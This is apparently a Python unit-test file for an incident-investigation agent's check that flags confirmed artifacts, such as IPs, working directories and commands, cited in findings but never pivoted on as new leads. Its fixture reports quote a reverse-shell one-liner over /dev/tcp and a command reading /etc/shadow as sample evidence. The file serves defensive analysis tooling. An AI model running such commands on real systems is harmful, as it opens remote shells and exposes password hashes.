"""Offline test: the unpivoted-artifact helper.

A confirmed artifact cited in ## Findings should have a corresponding pivot in
## New Leads. `_unpivoted_artifacts()` returns the ones missing it — a deterministic
SIGNAL fed to the per-task self-review (graph/reflection.py), not a standalone guard.

This used to mine IP literals out of findings bullets gated on an active-compromise
regex, so it could only fire for reverse-shell/C2 language about an IP. Artifacts now
come from the board, where the extractor already typed them, so any confirmed
artifact kind is covered. Precision comes from requiring the agent to have cited the
value in its own ## Findings.

Run from project root with:
    python -m pytest tests/unit/graph/test_pivot_guard.py
"""

from __future__ import annotations

import os
import sys
import unittest

project_root = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
sys.path.insert(0, project_root)

from agent.runtime.graph import validation  # noqa: E402

_STATE = {"case_id": "~1", "run_id": "r1", "agent_name": "investigation"}


def _artifacts(*contents: str) -> list[dict]:
    return [{"kind": "artifact", "content": c, "source": "evt-1"} for c in contents]


class UnpivotedArtifactTests(unittest.TestCase):
    def _run(self, board: list[dict], report: str) -> list[str]:
        original = validation._board_entries_for_validation
        validation._board_entries_for_validation = lambda state: board
        try:
            return validation._unpivoted_artifacts(_STATE, report)
        finally:
            validation._board_entries_for_validation = original

    def test_c2_ip_without_lead_is_flagged(self):
        report = (
            "## Findings\n"
            "- `evt-1` crontab added reverse shell `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1`.\n\n"
            "## Hypotheses\n- [confirmed] persistence installed.\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(
            self._run(_artifacts("ip: 10.0.2.5"), report), ["ip: 10.0.2.5"]
        )

    def test_artifact_with_a_lead_is_not_flagged(self):
        report = (
            "## Findings\n"
            "- `evt-1` crontab added reverse shell to `10.0.2.5:5555`.\n\n"
            "## New Leads\n"
            "- title: Trace all connections to 10.0.2.5\n"
            "  pivots: ip=10.0.2.5\n  evidence: evt-1\n  priority: 90\n"
        )
        self.assertEqual(self._run(_artifacts("ip: 10.0.2.5"), report), [])

    def test_artifact_never_cited_in_findings_is_not_flagged(self):
        """Board-wide artifacts are not re-flagged on every task — only what this
        task actually established and wrote down."""
        report = "## Findings\n- `evt-2` nothing of note.\n\n## New Leads\n- None.\n"
        self.assertEqual(self._run(_artifacts("ip: 10.0.2.15"), report), [])

    def test_no_findings_section_returns_empty(self):
        self.assertEqual(self._run(_artifacts("ip: 10.0.2.5"), "just some prose"), [])

    def test_working_directory_is_flagged(self):
        """The b9615cf7 case: a root command's working directory was a web upload
        path, cited in findings, pivoted on by nothing. The IP-only predecessor could
        not see it — wrong artifact type, and no reverse-shell language to gate on."""
        path = "/var/www/intranet.price.fox.org/wp-content/uploads/2022/01"
        report = (
            "## Findings\n"
            f"- `evt-1`: `phopkins` ran `list` as `root` from `PWD={path}`.\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(self._run(_artifacts(f"cwd: {path}"), report), [f"cwd: {path}"])

    def test_kinds_are_ordered_by_pivot_value_and_capped(self):
        path = "/var/www/site/wp-content/uploads"
        report = (
            "## Findings\n"
            f"- `evt-1` root ran `/bin/cat /etc/shadow` from `{path}` on host web01 "
            "as user phopkins from 10.0.2.5.\n\n"
            "## New Leads\n- None.\n"
        )
        out = self._run(
            _artifacts(
                "host: web01",
                "ip: 10.0.2.5",
                "user: phopkins",
                f"cwd: {path}",
                "command: /bin/cat /etc/shadow",
            ),
            report,
        )
        # cwd and command lead; host trails. Ordering is deterministic, not a verdict.
        self.assertEqual(out[0], f"cwd: {path}")
        self.assertEqual(out[1], "command: /bin/cat /etc/shadow")
        self.assertEqual(out[-1], "host: web01")
        self.assertLessEqual(len(out), validation._MAX_UNPIVOTED)

    def test_unknown_kinds_are_ignored(self):
        report = "## Findings\n- `evt-1` saw thing xyz.\n\n## New Leads\n- None.\n"
        self.assertEqual(self._run(_artifacts("mystery: xyz"), report), [])

    def test_artifact_a_queued_task_pivots_on_is_covered(self):
        report = (
            "## Findings\n- `evt-1` root ran `/bin/cat /etc/shadow`.\n\n"
            "## New Leads\n- None.\n"
        )
        covered = validation._task_pivot_ground(
            [
                {
                    "title": "Confirm the sudo content",
                    "description": "   - Pivots: `data.command=/bin/cat /etc/shadow`\n"
                    "   - Window: 13:10Z to 13:20Z\n",
                }
            ]
        )
        original = validation._board_entries_for_validation
        validation._board_entries_for_validation = lambda state: _artifacts(
            "command: /bin/cat /etc/shadow"
        )
        try:
            self.assertEqual(
                validation._unpivoted_artifacts(_STATE, report, covered=covered), []
            )
        finally:
            validation._board_entries_for_validation = original


class TaskPivotGroundTests(unittest.TestCase):
    """Coverage means a task PIVOTS on the artifact, not that it mentions it.

    Task descriptions quote supporting evidence, so matching an artifact against the
    whole description counts "cited as context" as "investigated" — the same
    citing-vs-pivoting confusion the unpivoted signal exists to catch. Only the title
    and the declared `Pivots:` line count.
    """

    def test_pivots_line_and_title_are_ground(self):
        ground = validation._task_pivot_ground(
            [
                {
                    "title": "Trace the pre-auth login path",
                    "description": "   - Pivots: `data.srcuser=phopkins`, `rule.groups=sudo`\n"
                    "   - Done when: an auth event is found.\n",
                }
            ]
        )
        self.assertIn("Trace the pre-auth login path", ground)
        self.assertIn("data.srcuser=phopkins", ground)
        self.assertNotIn("Done when", ground)

    def test_evidence_quoted_in_a_description_is_not_ground(self):
        path = "/var/www/site/wp-content/uploads/2022/01"
        ground = validation._task_pivot_ground(
            [
                {
                    "title": "Look for persistence",
                    "description": "   - Pivots: `agent.name=web01`, `rule.groups=syscheck`\n"
                    f'   - Context: "event 93U4: phopkins ran list as root from {path}"\n',
                }
            ]
        )
        self.assertIn("rule.groups=syscheck", ground)
        self.assertNotIn(path, ground)


if __name__ == "__main__":
    unittest.main(verbosity=2)
